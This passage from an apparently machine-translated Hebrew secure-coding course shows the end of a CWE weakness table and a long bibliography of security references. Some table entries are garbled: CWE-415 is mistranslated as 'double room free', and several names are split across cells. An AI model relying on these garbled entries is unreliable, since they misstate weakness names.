    <td>[28]</td> לא מוגנים מספיק<td><a href="https://cwe.mitre.org/data/definitions/704.html"> CWE-704</a></td>
    <td> המרת סוג שגויה או יציקה (!)</td>
  </tr>
  <tr>
    <td>[29]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/362.html">CWE-362</a></td>
    <td> ביצוע בו-זמני באמצעות משאב משותף עם סינכרון לא תקין ('מצב גזע')</td>
  </tr>
  <tr>
    <td>[30]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918</a></td>
    <td> זיוף בקשות בצד השרת (SSRF)</td>
  </tr>
  <tr>
    <td>[31]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/415.html">CWE-415</a></td>
     <td>חדר זוגי חינם (!)</td>
  </tr>
  <tr>
    <td>[32]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/601.html">CWE-601</a></td>
     <td>ניתוב מחדש של כתובת URL לאתר לא מהימן ('פתח ניתוב מחדש')</td>
  </tr>
  <tr>
    <td>[33]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/863.html">CWE-863</a></td>
    <td> הרשאה</td>
  </tr>
  <tr>
    <td>[34]</td>
     שגויה <td><a href="https://cwe.mitre.org/data/definitions/862.html">CWE-862</a></td>
    <td> הרשאה</td>
  </tr>
  <tr>
    <td>[35]</td>
     חסרה <td><a href="https://cwe.mitre.org/data/definitions/532.html">CWE-532</a></td>
    <td> הכללת מידע רגיש בקבצי</td>
  </tr>
  <tr>
    <td>[36]</td>
     יומן רישום <td><a href="https://cwe.mitre.org/data/definitions/306.html">CWE-306</a></td>
    <td> אימות חסר עבור פונקציה</td>
  </tr>
  <tr>
    <td>[37]</td>
     קריטית <td><a href="https://cwe.mitre.org/data/definitions/384.html">CWE-384</a></td>
    <td> קיבוע סשן (!)</td>
  </tr>
  <tr>
    <td>[38]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/326.html">CWE-326</a></td>
    <td> עוצמת הצפנה לא מספקת (!)</td>
  </tr>
  <tr>
    <td>[39]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/770.html">CWE-770</a></td>
    <td> הקצאת משאבים ללא מגבלות או ויסות</td>
  </tr>
  <tr>
    <td>[40]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/617.html">CWE-617</a></td>
    <td> קביעה ניתנת להשגה (!)</td>
  </tr>
</table>

אלה המסומנים ב-(!) נמצאים במהדורת 2019 אך לא במהדורת 2021.

# הפניות

(לא חלק מהקורס כשלעצמו)

אלף וואן (אליאס לוי), *לרסק את הערימה בשביל הכיף והרווח, *פראק #49, 1996 ([http://phrack.org/issues/49/14.html#article](http://phrack.org/issues/49/14.html#article))

Amodio, Dan Amodio, "קוד מרוחק עם הזרקת שפת ביטוי", 2012-12-14. (<http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/>)

אנדרסון, ג'יימס פ.*, מחקר תכנון טכנולוגיית אבטחת מחשבים*, כרך I, ESD-TR-73-51 (כרכים I ו-II), אוקטובר 1972 ([https://csrc.nist.gov/csrc/media/publications/conference-paper/1998/10/08/proceedings-of-the-21st-nissc-1998/documents/early-cs-papers/ande72a.pdf](https://csrc.nist.gov/csrc/media/publications/conference-paper/1998/10/08/proceedings-of-the-21st-nissc-1998/documents/early-cs-papers/ande72a.pdf)) ו-([https://csrc.nist.rip/publications/history/ande72.pdf](https://csrc.nist.rip/publications/history/ande72.pdf))

אנדרסון, ג'יימס פ.*, מחקר תכנון טכנולוגיית אבטחת מחשבים, *כרך II, 1972 ([https://apps.dtic.mil/dtic/tr/fulltext/u2/772806.pdf](https://apps.dtic.mil/dtic/tr/fulltext/u2/772806.pdf))

אנדרסון, רוס, *הנדסת אבטחה: מדריך לבניית מערכות מבוזרות אמינות* ([https://www.cl.cam.ac.uk/~rja14/book.html](https://www.cl.cam.ac.uk/~rja14/book.html))

באקוס, ג'.וו., ר.ג. ביבר, ס. בסט, ר. גולדברג, ה.ל. הריק, ר.א. יוז, ל.ב. מיטשל, ר.א. נלסון, ר. נוט, ד. סייר, פ.ב. שרידן, ה. שטרן, א. זילר.  *מערכת הקידוד האוטומטית FORTRAN עבור IBM 704 EDPM: מדריך ייחוס למתכנת*, חטיבת המדע היישומי ומחלקת המחקר לתכנות, תאגיד המכונות העסקיות הבינלאומי, 1956-10-15 ([https://archive.computerhistory.org/resources/text/Fortran/102649787.05.01.acc.pdf](https://archive.computerhistory.org/resources/text/Fortran/102649787.05.01.acc.pdf))

Bals, Fred*, מרק האלפבית של AppSec: מדריך ל- SAST, IAST, DAST ו- RASP,* בלוג Synopsys "שלמות תוכנה", 2018-08-14 ([https://www.synopsys.com/blogs/software-security/sast-iast-dast-rasp-differences/](https://www.synopsys.com/blogs/software-security/sast-iast-dast-rasp-differences/))

בארקר, איליין*, המלצה לניהול מפתח: חלק 1 - כללי, *NIST פרסום מיוחד 800-57 חלק 1 תיקון 5, 2020, ([https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf))

Birsan, Alex, 2021-02-09, "בלבול תלות: איך פרצתי לאפל, מיקרוסופט ועשרות חברות אחרות", (<https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610>)

טבלאות בובי, "ג'אווה", (<https://bobby-tables.com/java>)

בלאק, פול א'; באדג'ר, לי; גוטמן, ברברה; פונג, אליזבת*, צמצום דרמטי של פגיעויות תוכנה: דו"ח למשרד הבית הלבן למדיניות מדע וטכנולוגיה, *NISTIR 8151, המכון הלאומי לתקנים וטכנולוגיה של ארה"ב (NIST) מעבדת טכנולוגיית מידע, 2016-11 ([https://nvlpubs.nist.gov/nistpubs/ir/2016/NIST.IR.8151.pdf](https://nvlpubs.nist.gov/nistpubs/ir/2016/NIST.IR.8151.pdf))

Breeden II, John*, 9 כלי fuzzing העליון: מציאת שגיאות היישום המוזרות ביותר*, 2019 ([https://www.csoonline.com/article/3487708/9-top-fuzzing-tools-finding-the-weirdest-application-errors.html](https://www.csoonline.com/article/3487708/9-top-fuzzing-tools-finding-the-weirdest-application-errors.html))

ברסרס, ג'וש*, פגיעות שבורות חומרות*, 2020-05-25 ([https://opensourcesecurity.io/2020/05/27/broken-vulnerability-severities/](https://opensourcesecurity.io/2020/05/27/broken-vulnerability-severities/))

באטלר, ריקי ו., *מהן שיטות פורמליות? * ([https://shemesh.larc.nasa.gov/fm/fm-what.html](https://shemesh.larc.nasa.gov/fm/fm-what.html))

C רשימת שאלות נפוצות ([http://c-faq.com/ansi/undef.html](http://c-faq.com/ansi/undef.html))

קרליני, ניקולס ודיוויד וגנר, 2017,
"דוגמאות יריבות אינן מזוהות בקלות: עקיפת עשר שיטות גילוי"

Carlini, Nicholas Anish Athlye, Nicolas Papernot, et al., "על הערכת חוסן יריב", 2019-02-20, . <https://arxiv.org/pdf/1902.06705>

אוניברסיטת קרנגי מלון: המכון להנדסת תוכנה, חטיבת ה-CERT ([https://sei.cmu.edu/about/divisions/cert/index.cfm](https://sei.cmu.edu/about/divisions/cert/index.cfm))

צ'ן, ריימונד*, התנהגות לא מוגדרת יכולה לגרום למסע בזמן (בין היתר, אבל מסע בזמן הוא הכי מצחיק), *2014-06-27, ([https://devblogs.microsoft.com/oldnewthing/20140627-00/?p=633](https://devblogs.microsoft.com/oldnewthing/20140627-00/?p=633))

Cimpanu, Catalin*, Microsoft: 70 אחוז מכל באגי האבטחה הם בעיות בטוחות לזיכרון*, 2019-02-11 ([https://www.zdnet.com/article/microsoft-70-percent-of-all-security-bugs-are-memory-safety-issues/](https://www.zdnet.com/article/microsoft-70-percent-of-all-security-bugs-are-memory-safety-issues/))

Cimpanu, Catalin, "שתי ספריות Python זדוניות נתפסו גונבות מפתחות SSH ו- GPG", ZDNet, 2019-12-03, <https://www.zdnet.com/article/two-malicious-python-libraries-removed-from-pypi>

CISCO, *הדור הבא של הקריפטוגרפיה* ([https://tools.cisco.com/security/center/resources/next_generation_cryptography](https://tools.cisco.com/security/center/resources/next_generation_cryptography))

קוגשל, ג'ון, *עדכון פרוטוקול Git עבור SHA-256*, 2020 ([https://lwn.net/Articles/823352/](https://lwn.net/Articles/823352/))

הנציבות הלאומית לאינפורמטיקה וליברטס (CNIL), *המדריכים של CNIL: אבטחת נתונים אישיים*, 2018 ([https://www.cnil.fr/sites/default/files/atoms/files/cnil_guide_securite_personnelle_gb_web.pdf](https://www.cnil.fr/sites/default/files/atoms/files/cnil_guide_securite_personnelle_gb_web.pdf))

Commission Nationale Informatique & Libertés (CNIL), *פתרונות לשימוש אחראי בבלוקצ'יין בהקשר של נתונים אישיים*, 2018 ([https://www.cnil.fr/sites/default/files/atoms/files/blockchain_en.pdf](https://www.cnil.fr/sites/default/files/atoms/files/blockchain_en.pdf))

קריטריונים נפוצים, קריטריונים *נפוצים להערכת אבטחת טכנולוגיית מידע (CC) חלק 2 (*[https://www.commoncriteriaportal.org/](https://www.commoncriteriaportal.org/))

קורבט, יונתן, *אלגוריתם גיבוב חדש עבור Git*, 2020 ([https://lwn.net/Articles/811068/](https://lwn.net/Articles/811068/))

קוקס, בן, "ביקורת איכות מפתח SSH של משתמשי GitHub", 2015-06-02 (<https://blog.benjojo.co.uk/post/auditing-github-users-keys>)

הסוכנות לאבטחת סייבר ואבטחת תשתיות (CISA), הוראת חירום 21-01, (<https://www.cisa.gov/emergency-directive-21-01>)
הסוכנות לאבטחת סייבר ואבטחת תשתיות (CISA), התראה AA20-352A, (<https://www.cisa.gov/uscert/ncas/alerts/aa20-352a>)

דצ'אנד, סרגיי, *מה זה מהיר? *, 2020 ([https://blog.code-intelligence.com/what-is-fast](https://blog.code-intelligence.com/what-is-fast))

דלייטר, אורליאן; סטיבלט, ברטרנד; בלאק, פול א'; אוקון, ואדים; ריביירו, אתוס; כהן, טרי ס., *SATE V REPORT: עשר שנים של תערוכות כלי ניתוח סטטי*, NIST פרסום מיוחד 500-326, 2018 ([https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.500-326.pdf](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.500-326.pdf)) או ([https://doi.org/10.6028/NIST.SP.500-326](https://doi.org/10.6028/NIST.SP.500-326))

די פאולה, סטפנו וארשן דבירסיאג'י. "הזרקת שפת ביטוי", 2011-09-12, (<https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf>)

Dulin, Maxwell (ꓘ), מציאת מעקף הרשאה באתר שלי, 2022-03-03, (<https://maxwelldulin.com/BlogPost?post=9185867776>)

ECMA, ECMA-262, מהדורה 12, יוני 2021, מפרט שפה ECMAScript® 2021, "סוג המספר" ([https://www.ecma-international.org/ecma-262/11.0/index.html#sec-ecmascript-language-types-number-type]((https://www.ecma-international.org/ecma-262/11.0/index.html#sec-ecmascript-language-types-number-type))

Enosuchblog, 2022-12-28, "ReDoS "פגיעויות" ותמריצים לא מיושרים", <https://blog.yossarian.net/2022/12/28/ReDoS-vulnerabilities-and-misaligned-incentives>

הפיכת שיתוף משאבים בין מקורות ([https://enable-cors.org/](https://enable-cors.org/)) לזמין

Flatt Security Inc,, "מציאת הזרקת SQL בלתי נראית על ידי עקיפת פונקציות בריחה ב- mysqljs/mysql", 2022-02-21, (<https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4>)

פורום צוותי תגובה ואבטחה לתקריות (FIRST), *מסגרת השירותים הראשונה* ([https://www.first.org/standards/frameworks/](https://www.first.org/standards/frameworks/))

פורום צוותי תגובה לתקריות ואבטחה (ראשון), *צוות תגובה לתקריות אבטחת מוצר (PSIRT) מסגרת שירותים (*[https://www.first.org/standards/frameworks/](https://www.first.org/standards/frameworks/))

פורום צוותי תגובה ואבטחה  לתקריות (FIRST), *מסגרת השירותים של צוות התגובה לתקריות אבטחת מחשבים (CSIRT) * ([https://www.first.org/standards/frameworks/](https://www.first.org/standards/frameworks/))

פורום צוותי התגובה והאבטחה לתקריות (FIRST), *הנחיות ונהלים לתיאום וגילוי פגיעויות מרובות משתתפים*, ([https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1](https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1))

פורום צוותי תגובה ואבטחה לתקריות (FIRST), *פרוטוקול רמזור (TLP) * ([https://www.first.org/tlp/](https://www.first.org/tlp/))

פרידל, ג'פרי א.פ., *מאסטרינג ביטויים רגולריים, *מהדורה שלישית, אוריילי מדיה, ISBN 9780596528126, 2006-08 ([https://www.oreilly.com/library/view/mastering-regular-expressions/0596528124/](https://www.oreilly.com/library/view/mastering-regular-expressions/0596528124/))

Garavel, Hubert, et al*, שיטות פורמליות למערכות מחשבים בטוחות ומאובטחות, *מחקר BSI 875, 2013 ([https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Publikationen/Studien/formal_methods_study_875/formal_methods_study_875.pdf?&#95;&#95;blob=publicationFile&v=1](https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Publikationen/Studien/formal_methods_study_875/formal_methods_study_875.pdf?&#95;&#95;blob=publicationFile&v=1))

גאורגייב, מרטין; איינגאר, סובודה; יאנה, סומאן; אנובהאי, רישיטה; בונה, דן; שמאטיקוב, ויטלי; *הקוד המסוכן ביותר בעולם: אימות תעודות SSL בתוכנות שאינן דפדפן*, 2012 ([https://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf](https://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf))

ג'ראנד, אנדרו, *הבלוג של גו: טיפול בשגיאות ו-Go*, 2011 ([https://blog.golang.org/error-handling-and-go](https://blog.golang.org/error-handling-and-go))

אבטחת GitHub, *הודעות דוא"ל לאיפוס סיסמה שנשלחו לכתובת הלא נכונה*, 2016-07-05 ([https://bounty.github.com/researchers/jagracey.html](https://bounty.github.com/researchers/jagracey.html))

GitLab, *מה זה GitOps? * ([https://about.gitlab.com/topics/gitops/])

גודין, דן, 2015, "פעם נתפס כחסין כדורים, 11 מיליון+ סיסמאות אשלי מדיסון כבר נסדקו", *ארס טכניקה*, <https://arstechnica.com/information-technology/2015/09/once-seen-as-bulletproof-11-million-ashley-madison-passwords-already-cracked/>

גודינג, דן*, ביזת מפתחות קריפטו מ-SGX מאובטח במיוחד שולחת את אינטל לטרוף שוב, *ארס טכניקה, 2020-06-09 ([https://arstechnica.com/information-technology/2020/06/new-exploits-plunder-crypto-keys-and-more-from-intels-ultrasecure-sgx/](https://arstechnica.com/information-technology/2020/06/new-exploits-plunder-crypto-keys-and-more-from-intels-ultrasecure-sgx/))

גוגל, פרויקט OSS-Fuzz ([https://github.com/google/oss-fuzz](https://github.com/google/oss-fuzz))

גרינוולד, גלן, *מדוע פרטיות חשובה*, 2014 ([https://www.ted.com/talks/glenn_greenwald_why_privacy_matters](https://www.ted.com/talks/glenn_greenwald_why_privacy_matters) או [https://www.youtube.com/watch?v=pcSlowAhvUk](https://www.youtube.com/watch?v=pcSlowAhvUk))

הרנן, שון; למברט, סקוט; אוסטוולד, תומאש; Shostack, Adam*, מידול איומים: לחשוף פגמים תכנון המערכת אבטחה באמצעות גישת STRIDE*, 2006 ([https://web.archive.org/web/20070303103639/http://msdn.microsoft.com/msdnmag/issues/06/11/ThreatModeling/default.aspx](https://web.archive.org/web/20070303103639/http://msdn.microsoft.com/msdnmag/issues/06/11/ThreatModeling/default.aspx))

Homeholder, Allen*, מדריך ה-CERT לחשיפת פגיעות מתואמת*, 2019 ([https://vuls.cert.org/confluence/display/CVD/The+CERT+Guide+to+Coordinated+Vulnerability+Disclosure](https://vuls.cert.org/confluence/display/CVD/The+CERT+Guide+to+Coordinated+Vulnerability+Disclosure))

האברד, דאגלס*, הכישלון של ניהול סיכונים: מדוע הוא שבור וכיצד לתקן אותו, *ג'ון ויילי ובניו. עמ' 46, 2009 ([https://onlinelibrary.wiley.com/doi/book/10.1002/9781119198536](https://onlinelibrary.wiley.com/doi/book/10.1002/9781119198536))

IETF RFC 1983, *מילון מונחים למשתמשי אינטרנט*  ([https://tools.ietf.org/html/rfc1983](https://tools.ietf.org/html/rfc1983))

IETF RFC 3986, *מזהה משאבים אחיד (URI): תחביר כללי (*[https://tools.ietf.org/html/rfc3986](https://tools.ietf.org/html/rfc3986))

IETF RFC 5321, סעיף 2.3.11, *תיבת דואר וכתובת* ([https://tools.ietf.org/html/rfc5321#section-2.3.11](https://tools.ietf.org/html/rfc5321#section-2.3.11))

משרד נציב המידע (ICO), *מדריך לתקנה הכללית להגנה על נתונים (GDPR) (https://ico.org.uk/for-organisations/guide-to-data-protection/guide-to-the-general-data-protection-regulation-gdpr/)* [](https://ico.org.uk/for-organisations/guide-to-data-protection/guide-to-the-general-data-protection-regulation-gdpr/)

האיגוד הבינלאומי למומחי פרטיות (IAPP), *מה המשמעות של פרטיות? * ([https://iapp.org/about/what-is-privacy/](https://iapp.org/about/what-is-privacy/))

ISO/IEC 9899:2018, *שפות תכנות - C* (המכונה "C17").  תקן זה אינו זמין לציבור; הטיוטה הסופית שלו זמינה לציבור בכתובת ([https://web.archive.org/web/20181230041359if_/http://www.open-std.org/jtc1/sc22/wg14/www/abq/c17_updated_proposed_fdis.pdf](https://web.archive.org/web/20181230041359if_/http://www.open-std.org/jtc1/sc22/wg14/www/abq/c17_updated_proposed_fdis.pdf))

ISO/IEC 15026-2:2011, * הנדסת מערכות ותוכנה - אבטחת מערכות ותוכנה - חלק 2: מקרה אבטחה* ([https://www.iso.org/standard/52926.html](https://www.iso.org/standard/52926.html))

קפלן-מוס, יעקב*, לא כל התוקפים שווים: הבנה ומניעת DOS ביישומי אינטרנט*, 2020 ([https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/](https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/))

kernel.org, *סגנון קידוד ליבת לינוקס* ([https://www.kernel.org/doc/Documentation/process/coding-style.rst](https://www.kernel.org/doc/Documentation/process/coding-style.rst))

לוין, ראפ*, עם התנהגות לא מוגדרת, הכל אפשרי, *2018-08-17, ([https://raphlinus.github.io/programming/rust/2018/08/17/undefined-behavior.html](https://raphlinus.github.io/programming/rust/2018/08/17/undefined-behavior.html))

קרן לינוקס*, הבנת טכנולוגיית קוד פתוח ובקרות ייצוא אמריקאיות, *2021-07-19, <https://www.linuxfoundation.org/tools/understanding-us-export-controls-with-open-source-projects/>)

לוקיידס, מייק, *ביקור חוזר ב"מה זה DevOps",* 2014-06-30 ([http://radar.oreilly.com/2014/06/revisiting-what-is-devops.html](http://radar.oreilly.com/2014/06/revisiting-what-is-devops.html))

MacCarthaigh, Colm*, חשיבה אוטומטית ואמזון s2n*, 2016-09-08 ([https://aws.amazon.com/blogs/security/automated-reasoning-and-amazon-s2n/](https://aws.amazon.com/blogs/security/automated-reasoning-and-amazon-s2n/))

Microsoft, *מתן שמות לקבצים, נתיבים ומרחבי שמות* ([http://msdn.microsoft.com/en-us/library/aa365247.aspx](http://msdn.microsoft.com/en-us/library/aa365247.aspx))

מיקרוסופט, *מידול איומים* ([https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling](https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling))

Microsoft*, תזמון פגיעויות עם פענוח סימטרי במצב CBC באמצעות ריווח*, 2020-07-15 ([https://docs.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode](https://docs.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode))

Microsoft, "3 דרכים להפחתת סיכונים בעת שימוש בהזנות חבילות פרטיות", (<https://azure.microsoft.com/en-us/resources/3-ways-to-mitigate-risk-using-private-package-feeds/>)

מינוצ'ה, שריאס, *ביטויים רגולריים לפולק רגולרי* ([https://refrf.shreyasminocha.me/](https://refrf.shreyasminocha.me/))

מיטשל, טום, 1997, *למידת מכונה*. ניו יורק: מקגרו היל. ISBN 0-07-042807-7. OCLC 36417892.

מיטר ([https://www.mitre.org/](https://www.mitre.org/))

MITRE, ספירת חולשות נפוצות (CWE) ([https://cwe.mitre.org/](https://cwe.mitre.org/))

MITRE, ספירת חולשות נפוצות  (CWE), *2019 CWE 25 שגיאות התוכנה המסוכנות ביותר* ([https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html](https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html))

מוזילה, *שיתוף משאבים בין מקורות (CORS) * ([https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS))

ויקי מוזילה, *חמצון* ([https://wiki.mozilla.org/Oxidation](https://wiki.mozilla.org/Oxidation))

ויקי של Mozilla, *אבטחה/TLS בצד השרת* ([https://wiki.mozilla.org/Security/Server_Side_TLS](https://wiki.mozilla.org/Security/Server_Side_TLS))

מוזילה, חלודה לעומת C++ ב-macOS פיירפוקס מדי לילה ([https://docs.google.com/spreadsheets/d/1flUGg6Ut4bjtyWdyH_9emD9EAN01ljTAVft2S4Dq620/edit#gid=885787479](https://docs.google.com/spreadsheets/d/1flUGg6Ut4bjtyWdyH_9emD9EAN01ljTAVft2S4Dq620/edit#gid=885787479))

מוזילה, *מדיניות מאותו מקור* ([https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy))

מסד נתונים לאומי של פגיעויות (NVD), CVE-2021-44228, (<https://nvd.nist.gov/vuln/detail/CVE-2021-44228>)

ניוקומב, כריס; ראט, טים; ג'אנג, אוהד; מונטאנו, בוגדן; ברוקר, מארק; Daerdeuff, Michael, *שימוש בשיטות פורמליות ב- Amazon Web Services*, 2014-09-29 ([https://lamport.azurewebsites.net/tla/formal-methods-amazon.pdf](https://lamport.azurewebsites.net/tla/formal-methods-amazon.pdf))

ניוקומב, כריס; ראט, טים; ג'אנג, אוהד; מונטאנו, בוגדן; ברוקר, מארק; Daerdeuff, Michael, *כיצד אמזון שירותי אינטרנט משתמשים בשיטות פורמליות*, תקשורת של ACM, כרך 58 מס '4, עמודים 66-73, 10.1145/2699417, 2015-04 ([https://cacm.acm.org/magazines/2015/4/184701-how-amazon-web-services-uses-formal-methods/fulltext](https://cacm.acm.org/magazines/2015/4/184701-how-amazon-web-services-uses-formal-methods/fulltext))

ניקולאי, מריה-אירינה, מתיו סין, מין נגוק טראן, ביט בוסר, אמבריש רוואט, מרטין ויסטובה, ולנטינה זנטסקי, נטלי ברקאלדו, בראיינט צ'ן, הייקו לודוויג, איאן מ. מולוי, בן אדוארדס,
v1.0.0 ארגז כלים של חוסן יריב
2019-11-15<https://arxiv.org/abs/1807.01069>

האתר הרשמי של האיחוד האירופי עבור טקסט GDPR ([https://eur-lex.europa.eu/eli/reg/2016/679/oj](https://eur-lex.europa.eu/eli/reg/2016/679/oj))

אוהם, מארק; צלחת, הנריק; סיקוש, ארנולד; מאייר, מיכל*, אוסף הסכינים של Backstabber: סקירה של התקפות שרשרת האספקה של תוכנות קוד פתוח*, 2020-05-19 ([https://arxiv.org/abs/2005.09535](https://arxiv.org/abs/2005.09535))

קרן אבטחת קוד פתוח  (OpenSSF), *תוכנית תג שיטות עבודה מומלצות של OpenSSF* ([https://bestpractices.coreinfrastructure.org/en](https://bestpractices.coreinfrastructure.org/en))

קרן אבטחת קוד פתוח (OpenSSF), אבטחת *BadgeApp: מקרה האבטחה שלה* ([https://github.com/coreinfrastructure/best-practices-badge/blob/master/doc/security.md](https://github.com/coreinfrastructure/best-practices-badge/blob/master/doc/security.md))

קרן אבטחת קוד פתוח (OpenSSF), קבוצת העבודה לגילוי פגיעויות ([https://github.com/ossf/wg-vulnerability-disclosures](https://github.com/ossf/wg-vulnerability-disclosures))

קבוצת העבודה לגילוי פגיעויות של קרן האבטחה בקוד פתוח (OpenSSF), מדריך לגילוי פגיעויות מתואם עבור פרויקטים של תוכנות קוד פתוח ([https://github.com/ossf/oss-vulnerability-guide](https://github.com/ossf/oss-vulnerability-guide))

פתח את פרוייקט אבטחת  יישומי אינטרנט (OWASP), *OWASP 10 סיכוני האבטחה המובילים של יישומי אינטרנט* ([https://owasp.org/www-project-top-ten](https://owasp.org/www-project-top-ten))

פתח פרויקט אבטחת יישומי אינטרנט  (OWASP), *OWASP Mobile Top 10* ([https://owasp.org/www-project-mobile-top-10/](https://owasp.org/www-project-mobile-top-10/))

פרוייקט אבטחת יישומי אינטרנט פתוח (OWASP), *פרוייקט האינטרנט של הדברים (*[https://wiki.owasp.org/index.php/OWASP_Internet_of_Things_Project](https://wiki.owasp.org/index.php/OWASP_Internet_of_Things_Project))

פרוייקט אבטחת יישומי אינטרנט פתוח (OWASP), *מניעת שירות של ביטוי רגיל - ReDoS* ([https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS))

פתח את פרוייקט אבטחת יישומי האינטרנט  (OWASP), *OWASP XML ישויות חיצוניות*  (XXE) (([https://owasp.org/www-פרויקט-העשירייה הראשונה/2017/A4_2017-XML_External_Entities_(XXE).html]https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE).html))

פתיחת פרוייקט אבטחת יישומי אינטרנט (OWASP), *הפניות מחדש לא מוסמכות והעברת גיליון רמאות* ([https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html))

פרוייקט אבטחת יישומי אינטרנט פתוח (OWASP), *גיליון רמאות גילוי פגיעויות* ([https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html))

Qualys, *בדיקת שרת SSL* ([https://www.ssllabs.com/ssltest/](https://www.ssllabs.com/ssltest/))

Patchstack, 2022, מצב האבטחה של וורדפרס ב-2021 ([https://patchstack.com/whitepaper/the-state-of-wordpress-security-in-2021/]( https://patchstack.com/whitepaper/the-state-of-wordpress-security-in-2021/))

פטרו, דן ואלן ססיל, 2021, אתה עושה IoT RNG, DEF CON 29 ([https://labs.bishopfox.com/tech-blog/youre-doing-iot-rng](https://labs.bishopfox.com/tech-blog/youre-doing-iot-rng)) עם מצגת ב- [https://www.youtube.com/watch?v=Zuqw0-jZh9Y](https://www.youtube.com/watch?v=Zuqw0-jZh9Y)

פיל, 2016-04-19, "זיהוי השימוש ב"תלתל | bash" צד שרת", idontplaydarts.com, <https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/>

מכון Ponemon LLC*, עלויות והשלכות של פערים בתגובות פגיעות*, 2019 ([https://www.servicenow.com/lpayr/ponemon-vulnerability-survey.html](https://www.servicenow.com/lpayr/ponemon-vulnerability-survey.html))

PostgreSQL, *PostgreSQL 14*, "פונקציות ביצוע פקודה",
(<https://www.postgresql.org/docs/current/libpq-exec.html>).


רברט, אלכסנדר; צ'ה, סאנג קיל; אבגרינוס, תנסיס; פוט, יונתן; וורן דוד; גריקו, גוסטבו; ברומלי, דיוויד, *אופטימיזציה של בחירת זרעים ל-Fuzzing*, 2014 ([https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-rebert.pdf](https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-rebert.pdf))

כובע אדום, *מה זה DevSecOps? * ([https://www.redhat.com/en/topics/devops/what-is-devsecops](https://www.redhat.com/en/topics/devops/what-is-devsecops))

כובע אדום, *מה זה GitOps? * ([https://www.redhat.com/en/topics/devops/what-is-gitops])

Regehr, John, *מדריך להתנהגות לא מוגדרת ב- C ו- C++ (חלקים 1-3), *2010 ([http://blog.regehr.org/archives/213](http://blog.regehr.org/archives/213))

רייכל, רוברט, *איך אנחנו מאיימים מודל*, 2020-09-02 ([https://github.blog/2020-09-02-how-we-threat-model/](https://github.blog/2020-09-02-how-we-threat-model/))

פרויקט בנייה הניתנת לשחזור, "הגדרות", (<https://reproducible-builds.org/docs/definition/>)

ריצ'י, דיאן, "הוראות פריצה לנתונים: מה לעשות לאחר התקפה", *מגזין אבטחה, *2015-02-01, <https://www.securitymagazine.com/articles/86071-data-breach-directions-what-to-do-after-an-attack>

רוג'רס, טוני*, שקרים מתכנתים מאמינים על שמות - עם דוגמאות*, 2018 ([https://shinesolutions.com/2018/01/08/falsehoods-programmers-believe-about-names-with-examples/](https://shinesolutions.com/2018/01/08/falsehoods-programmers-believe-about-names-with-examples/))

רומיילר, יולן, *המדריך הסופי ל"הטיית מודולו וכיצד להימנע ממנה"! * (<https://research.kudelskisecurity.com/2020/07/28/the-definitive-guide-to-modulo-bias-and-how-to-avoid-it/>)

רויס, וינסטון ו.*, ניהול פיתוח מערכות גדולות: מושגים וטכניקות*, 1970 ([https://dl.acm.org/doi/10.5555/41765.41801](https://dl.acm.org/doi/10.5555/41765.41801))

שפת תכנות חלודה, *שגיאות הניתנות לשחזור עם תוצאה* ([https://doc.rust-lang.org/book/ch09-02-recoverable-errors-with-result.html](https://doc.rust-lang.org/book/ch09-02-recoverable-errors-with-result.html))

SAFECode חומרי הדרכה ([https://safecode.org/training/](https://safecode.org/training/))

SAFECode*, עקרונות להערכת אבטחת תוכנה*, 2019 ([https://safecode.org/principles-of-software-assurance-assessment/](https://safecode.org/principles-of-software-assurance-assessment/))

זלצר, ג'רום ה., שרודר, מיכאל ד.*, ההגנה על מידע במערכות מחשב*, 1975 ([http://web.mit.edu/Saltzer/www/publications/protection/index.html](http://web.mit.edu/Saltzer/www/publications/protection/index.html))

